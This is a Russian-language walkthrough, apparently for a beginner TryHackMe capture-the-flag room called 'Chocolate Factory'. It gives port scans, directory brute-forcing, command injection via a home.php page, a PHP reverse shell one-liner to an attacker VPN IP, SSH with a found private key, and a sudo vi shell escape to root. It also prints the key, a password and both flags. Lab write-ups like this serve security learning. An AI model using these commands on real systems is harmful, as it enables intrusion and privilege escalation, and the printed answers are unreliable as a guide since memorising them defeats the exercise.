[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Chocolate Factory](https://tryhackme.com/r/room/chocolatefactory)

Всего 2 задания:
## Задание 1
 Добро пожаловать на шоколадную фабрику Вилли Вонки!

Эта комната была спроектирована так, чтобы хакеры могли снова посетить шоколадную фабрику Вилли Вонки и встретиться 
с Умпа Лумпой. 

Это комната, подходящая для новичков!

### Ответьте на вопросы ниже
Разверните машину!
```commandline
Ответ не нужен
```

## Задание 2
### Ответьте на вопросы ниже
Введите найденный вами ключ!

```commandline
sudo nmap -p- -n <ip-адрес машины>
nmap --script=баннер <ip-адрес машины> -p21-125 -v
nc <ip-адрес машины> 113
sudo gobuster dir -u http://<ip-адрес машины>/ -w /home/prowl/SecLists/Discovery/Web-Content/big.txt -x txt,php,py,sh -o dir_brute
```
Очевидно, что наиболее перспективным является файл , home.php поскольку он позволяет выполнять команды:
```commandline
http://<IP>/home.php
cd /home/ && ls -al
```
в /home есть два каталога: один — root, а другой — charlie. перейдем в /var/www/html и посмотрим, нет ли там 
чего-нибудь скрытого. 
```commandline
cd /var/www/html && ls -al
or
curl -s -XPOST -d "command=ls%20-l" http://<IP>/home.php

cat key_rev_key
strings key_rev_key
chmod 777 kye_rev_key
./key_rev_key
# laksdhfas
```

```commandline
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```
Какой пароль у Чарли?
```commandline
curl -s -XPOST -d "command=cat%20validate.php" http://<IP>/h<html>p
```
```commandline
cn7824
```
изменить пользователя на charlie
```commandline
http://<IP>/home.php
php -r '$sock=fsockopen("your-vpn-ip",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
nc -lvnp 4444
cd /home/charlie
ls
cat teleport
chmod 600 id_rsa_file
ssh -i id_rsa_file charli@<IP>
```
```commandline
Ответ не нужен
```
Введите флаг пользователя
```commandline
cat user.txt
```
```commandline
flag{cd5509042371b34e4826e4838b522d2e}
```
Введите корневой флаг
```commandline
sudo -l
sudo  vi  -c ':!/bin/sh'  /dev/null
cd /root
ls
cat root.py
```
Используя наш полученный ключ из двоичного файла «key_rev_key», мы можем запустить скрипт Python, введя нужный ключ, 
который мы нашли. 
```commandline
python root.py
```
```commandline
flag{cec59161d338fef787fcb4e296b42124}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)